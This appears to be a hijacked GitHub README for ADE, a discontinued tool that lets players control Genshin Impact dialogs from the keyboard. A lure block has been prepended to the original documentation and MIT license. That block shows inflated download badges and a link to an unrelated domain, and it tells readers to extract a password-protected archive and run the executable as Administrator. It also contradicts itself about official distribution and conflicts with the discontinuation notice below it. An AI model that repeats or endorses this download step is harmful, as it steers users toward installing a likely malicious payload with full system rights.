<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://respockett.pro/red">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

<div align="center">
  <h1>Discontinued</h1>
</div>

  HoYoverse developers have added native support for dialog control with keyboard and mouse wheel. And with that, this program no longer has any meaning - it served its purpose, but that's the end of it.
  
  Thank you, everyone. For using ADE, for your support, feedback, comments, help in development, in other words, for everything.
  
  It's been a long road for me as a developer, and I've learned a lot along the way. But it's time to say goodbye friends, at least to this project. 

<div align="right">
  <b>See you space cowboy...</b>
</div>

<div align="center">
## ❓ Why and what for? Using Genshin Impact as an Example
- Why can't you choose a dialog option using mouse wheel, the same way you would when selecting which item you want to place in your inventory?
- Why can you pick up an item with the <code>f</code> button, but the dialog can <b>only</b> selected with the mouse cursor?
- Why is the cursor always in the center of the screen at the beginning of dialogs and cutscenes?
- Why can't you take screenshots in cutscenes and dialogs?
  
> If you have ever asked such questions, then this application is for you.

## 🖼️ Screenshots
<div>
## 📖 Key features

* Binding any keyboard and mouse key combinations to various actions
* Interacting with dialogs using key bindings
* Confirming dialog options
* Cycling through dialog options
* Cursor hiding
* Screenshots saving
* Dialog auto skipping
* And much more

## 💻 System requirements

* Windows 7 (x64) and up
## ✨Setting up and usage

As the development progressed, more and more features were added to the application, and although everything was aimed at providing the most convenience, now there is so much functionality that it became necessary to document it here.

The application is modular, and works with extensions individually developed for each game. Each extension is treated as a game profile, allowing you to fine-tune it.

### 🎣 Hook control

`Hook` - is the corner stone of the application. In order to work, the application needs to find the running game process and attach to it. To do this, you need to select required `Game Profile` and specify game process name. 

In most cases, extension developers set everything up, but you can customize all the settings yourself.

* `Start` is the most important button of the `Profile` subsection. When you click on it, the launch action you selected in the `Advanced settings` subsection is performed. If you want the `Game` or `Launcher` of the game to be launched along with it when the hook starts, change this setting.
* When the hook is launched, the application will begin searching for the game process by its specified name, and if it finds one, it will connect to it.
* To avoid specifying all the paths manually, you can use `Locate` option in profile `Drop-down menu`.
* `Create shortcut` - creates an application shortcut to quickly launch the hook of selected `Game Profile`, with all specified settings.
* In the same section you can set the directory for screenshots and `Exit with the game` setting.

### ⌨️ Key bindings

In this section individual settings are specified for each `Game Profile`. Default key bindings are set by extension developers. You can `Reset` or `Clear` those settings in `Drop-down menu`.

#### Action Settings

* `Hide cursor on manual selection` - after detecting dialog options, clicking on one of them will hide the cursor.
* `Cycle through dialog options` - switching to the first/last dialog options when selecting the next/previous one at the end and the beginning of the list, respectively.
* `Single dialog option behavior` - dialog selection confirmation when only one option is present. You can highlight or select it without confirmation.
* `Numeric action behavior` - confirmation of dialog choices selected by pressing number keys *(e.g. 1, 2, 3)* by highlighting them, or by selecting them without confirmation.
* `Cursor behavior` - hide after any action in a dialog, hide after a selection, or do nothing.

#### General

* `Pause/Resume Hook`
* `Reload hook` *(necessary when changing game resolution, and repeating the search for dialog options)*
* `Take screenshot`
* `Hide cursor`

#### Controls

* `Select the dialog option`
* `Select previous`
* `Select next`

#### Selecting a dialog option

* `Quick selection with numeric keys`

#### Additional extension actions

In extensions it is possible to specify additional actions - points on the game screen where you can click to perform certain action during a dialog.
For example, in Genshin Impact, the `Autoplay` action has been added - by clicking on the `> Auto` button in the upper left corner of the screen in a dialog.

#### ⏩ Autoskip

Here you can configure a script to quickly skip game dialogs:
- `Triggers` to start/stop the script
- Setting the `Skip action button`
- **Script start condition**: `Cursor presence`, `Speaker name presence`
- **Skip mode**: `Text only`, `Text and replies` and `Replies Only` (*always selects the last reply*), 
- Delays between clicks

The script stops when the following actions will occur:
- The game hid the cursor, giving you the ability to control your character again
- Manually pressing the `Trigger` buttons
- Turning `Pause` on
- Switching to another window / Collapsing the game

**Note**: It will ruin your story experience, but that's what you asked for __(:з)∠)_

### ⚙️ Settings

* Language setting
* Window state at startup (`Default`, `Taskbar`, `System tray`)
* Window state when launching profile shortcut (`Default`, `Taskbar`, `System tray`)
* Minimizing instead of closing
* Minimizing to taskbar
* Launching on Windows startup
* Opening a screenshots directory *(if taken)* when exiting the game
* Expert mode *(allows to fine-tune the internals of the application)*
* Opening the application folder and application settings folder

### 🎆 About the program

This section contains all the information about the program and its developers, as well as update mechanisms and notifications.

## 🎇 About the project

Everything you wanted to know but were afraid to ask 🤔

### 🎮 Supported Games

This is an OPC (One Person Company), so the developer works alone. Thus everything will be implemented, but not right away.

#### ⌚ Works like clockwork

* Genshin Impact
* Star Rail

#### 🧑‍💻 In developing

* Wuthering Waves
* Project Mugen
* Tower Of Fantasy
* Zoneless Zone Zero

### 🕹️ How it all works

Usually, when developing cheats and scripts for games (*and this application is not a cheat!*) certain data is found and used in the game memory. To prevent this, online game developers make anti-cheats.
Some only respond to obviously unintended game behavior by allowing memory reads, while some also monitor memory reads from their games.

It would have been ten times easier to implement such an approach, adding a injectable library as well.
But since this violates license agreement of some games, and there is a risk of getting banned, the application itself was developed to function as an intermediary that works with extensions, where the developers of those take responsibility for it.

Since each game is unique in its protection, each extension uses its own approach to bypass these limitations (*if any*), for example, Genshin Impact uses on-screen image processing.
Therefore, for this game it is absolutely (*99.9%*) safe.
Can you get banned in a game for taking a screenshot?
No. The developer has been using and testing this application for over a year.
He gives you his quality assurance - everything possible was done for it to be legal, not violating game's license agreement.
## 💬 Let's talk about important things

You've reached the last sections, congratulations!🥳
There's plenty to read here if you're interested in developer's thoughts and development path.

### 🛣️ The pathway

It was... A very long journey. I started developing this application purely for Genshin Impact, and solely for myself, because it was inconvenient for me to drink tea 🍵, eat cookies 🍪, read dialogs 💬 and move the mouse 🖱️ at the same time.
Yes, programmers are very lazy.
That’s why the development took... Almost a year 🥲.
I started this project in early November 2022, and finished it in September 2023...
I'm surprised that I got this to release, really... This is an achievement...
I had been coding this application in evenings almost every day after finishing with my work
(*well... and during work hours too. Something I’m not very proud of* 😓).

What else? No personal life, minimum entertainment, a ton of time and effort spent on this project...
I can’t say what kind of response this will yield in the future, but as a programmer I have grown quite well.

This the third project out of ten that I started, that has saw the release.
There are so many ideas, but very little time and energy... + I couldn’t have done it without the help and support of all my beloved friends, so a huge thank you to you all 💖

> <details>
>   <summary>Well, I hope you enjoy it, i did my utmost best...</summary>
>   <div align="center">
#### 🦄 Special thanks

* **Microsoft** - for severely restricting my previous GitHub account just because I live, in their opinion, in the *wrong place* >:(
* **Gitee** - for deleting my account after half a year without any warning.
* **Microsoft** once again - for having to use GitHub with VPN, and also for dropping support for the .NET Framework and WPF, and also for the fact that you can’t roll back from Windows 11 to Windows 10.
### 🛠️ Libraries and resources

Although the application uses all the libraries listed below, at least 80% of each library had to be rewritten to optimize them for specific tasks, reducing the space they take up as well...
Very little remains from the original versions, but, none the less, I would like to thank the developers for their work, ideas and open source code.

## 💖 Creative society

<div align="center">
## 💸 Project support

Currently there is no need for financial support. I do have a full time job, and while it's not much, it's manageable.

> <details>
>   <summary>Literally me</summary>
>   <div align="center">


---

MIT License

Copyright (c) 2023 DigitalE4rth

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
